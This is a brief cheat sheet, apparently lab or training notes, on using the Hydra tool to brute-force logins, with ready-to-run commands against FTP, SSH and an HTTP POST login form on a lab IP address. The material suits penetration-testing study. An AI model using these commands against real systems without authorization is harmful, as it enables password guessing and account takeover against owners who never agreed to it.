Hydra is a brute force online password cracking program; a quick system login password 'hacking' tool.

FTP
> hydra -l user -P passlist.txt ftp://10.10.149.128

SSH
> hydra -l {UserName} -P {Wordlist path} 10.10.149.128 -t 4 ssh

Post Web Form
> hydra -l {UserName} -P {Wordlist path} 10.10.149.128 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

